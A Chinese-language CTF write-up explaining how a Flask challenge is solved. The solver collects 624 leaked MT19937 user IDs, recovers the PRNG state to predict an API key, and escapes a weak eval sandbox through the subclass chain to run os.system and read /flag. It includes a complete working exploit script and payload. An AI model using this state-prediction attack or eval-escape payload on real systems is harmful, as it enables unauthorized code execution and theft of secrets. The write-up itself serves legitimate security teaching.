# guess

## 题目简述

题目是一个 Flask Web 服务，注册接口返回由 `random.Random().getrandbits(32)` 生成的 `user_id`，`/api` 接口又用同一个 MT19937 随机数状态生成一次 32 bit key。只要预测下一次随机数，就能通过 key 校验并触发后续 `eval(payload, {'__builtin__':{}})`。

附件源码中的关键点是：`generate_random_string()` 直接返回 `rd.getrandbits(32)`；应用启动时先用一次随机数设置 `app.secret_key`，又用一次随机数赋值给全局变量 `a`，之后注册用户时才继续返回 `user_id`。`/api` 路由没有检查 session，只比较用户提交的 `key` 和服务端下一次生成的 `key2`，通过后执行 payload。这里的 `eval` 限制只清了 `__builtin__`，仍可通过 Python 对象继承链取回可用的 builtins 并调用 `os.system`。

## 解题过程

### 关键观察

外链工具 `pyrandcracker` 的作用是根据 MT19937 的输出恢复内部状态：MT19937 状态由 624 个 32 bit 输出决定，因此连续提交 624 个 `getrandbits(32)` 结果后，就可以预测下一次输出。这里注册接口正好泄露连续的 32 bit `user_id`，所以可以把 624 次注册结果喂给 `RandCracker.submit()`，再用 `rnd.getrandbits(32)` 得到下一次 `/api` 期望的 key。

需要注意，服务启动阶段已经消耗了两个随机数，但这不影响攻击：状态恢复只需要后续 624 个连续输出，注册接口返回的 `user_id` 正好满足条件。不要在状态恢复完成后额外请求 `/api` 试错，因为失败响应虽然会泄露 `key2`，但也会消耗一次随机数，使本地预测状态和服务端错位。

```Python
from pyrandcracker import RandCracker
import time, random, requests, json, os
from tqdm import *

rd = random.Random()

url = 'http://<target>'

data = []

for i in tqdm(range(624)):

    res = requests.post(f'{url}/register', json={
        'username':str(os.urandom(10)),
        'password':'123'
    })

    try:
        user_id = res.json()['user_id']
    except Exception as e:
        print(res.text)

    time.sleep(0.1)
    data.append(int(user_id))

# 初始化随机数生成器

# 初始化预测器
rc = RandCracker()

# data = [rd.getrandbits(32) for _ in range(624)]
for num in data:
    # 提交共计312 * 64 = 19968位
    rc.submit(num)
# 检查是否可解并自动求解
rc.check()

key = rc.rnd.getrandbits(32)
print(f"predict next random number is {key}")

payload = '''
[k for i,k in enumerate({}.__class__.__base__.__subclasses__()) if '__init__' in k.__dict__ and 'wrapper' not in k.__init__.__str__()][0].__init__.__globals__['__builtins__']['__import__']('os').system('mkdir /app/static/ && cat /flag > /app/static/1.txt')
'''

res = requests.post(f'{url}/api', json={
    'key': key,
    'payload':payload
})

print(res.text)
```

脚本流程是：

1. 连续调用注册接口 624 次，收集返回的 `user_id`。
2. 将每个 `user_id` 按 32 bit 输出提交给 `RandCracker`，恢复 MT19937 状态。
3. 预测下一次 `getrandbits(32)`，作为 `/api` 的 `key`。
4. 通过 payload 走 `object.__subclasses__()` 到可用函数的 `__globals__`，再从 `__builtins__` 取 `__import__`，调用 `os.system` 把 flag 写到静态目录。

附件源码中 `/api` 没有要求登录态，因此脚本不需要注册后再登录；注册只是为了收集可见随机数输出。`eval(payload, {'__builtin__':{}})` 里的键名还写成了 `__builtin__` 而不是 Python 3 的 `__builtins__`，这进一步说明它不是可靠沙箱。

## 方法总结

- 核心技巧：利用 Web 接口连续泄露 MT19937 输出，恢复 PRNG 状态后预测鉴权 key，再利用不安全 `eval` 执行命令。
- 识别信号：看到 Python `random.Random()` 生成的可见 token、用户 ID、验证码或 key，并且同一实例继续生成鉴权值时，应想到收集 624 个 32 bit 输出做状态恢复。
- 复用要点：`RandCracker` 需要喂入与 `getrandbits(32)` 对齐的输出；如果服务端在收集样本后额外消耗随机数，预测前要同步消耗次数。`eval` 沙箱只清空 builtins 不可靠，尤其是键名写错或对象继承链可达时，仍可能恢复导入能力。
